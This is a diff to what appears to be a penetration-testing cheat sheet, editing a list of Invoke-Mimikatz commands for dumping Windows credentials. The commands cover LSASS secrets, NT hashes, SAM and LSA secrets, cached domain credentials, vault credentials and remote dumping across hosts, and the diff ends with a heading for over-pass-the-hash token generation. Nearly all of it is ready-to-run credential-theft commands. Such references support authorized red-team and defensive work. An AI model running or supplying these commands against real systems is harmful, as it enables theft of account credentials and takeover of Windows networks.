@@ -166,16 +166,16 @@ Invoke-Mimikatz -command '"sekurlsa::ekeys"'
 <strong>Invoke-Mimikatz -command '"token::elevate" "privilege::debug" "sekurlsa::ekeys"'
 </strong>Invoke-Mimikatz -Command vault::cred /patch   //Scheduled tasks
 Invoke-Mimikatz -Command lsadump::lsa /patch  //local accounts
+Invoke-Mimikatz -Command lsadump::lsa /inject //local accounts
 
 Invoke-Mimikatz -Command sekurlsa::wdigest
-Invoke-Mimikatz -Command sekurlsa::msv //LM &#x26; NT Hashes
+Invoke-Mimikatz -Command sekurlsa::msv         //LM &#x26; NT Hashes &#x26; Machine Account$
 Invoke-Mimikatz -Command sekurlsa::credman sekurlsa::credman
 <strong>Invoke-Mimikatz -Command sekurlsa::logonPasswords full
 </strong>
 <strong>Invoke-Mimikatz -command lsadump::cache
 </strong>Invoke-Mimikatz -command lsadump::sam
 Invoke-Mimikatz -command lsadump::secrets
-Invoke-Mimikatz -Command '"token::elevate" "vault::cred /patch"'
 
 Invoke-Mimikatz -DumpCreds   //default parameter
 <strong>
@@ -183,8 +183,8 @@ Invoke-Mimikatz -DumpCreds   //default parameter
 Invoke-Mimikatz -command '"sekurlsa::ekeys"' -Computername @("host1","host2")    //uses PowerShell remoting cmdlet Invoke-Command (need local admin privs on remote host)
 <strong>
 </strong><strong>When .exe run first:
-</strong>privilege::debug
-token::elevate
+</strong>token::elevate
+privilege::debug
 </code></pre>
 
 **Write to lsass / "over pass the hash" - generate tokens from hashes (we have the hash for the User specified)**
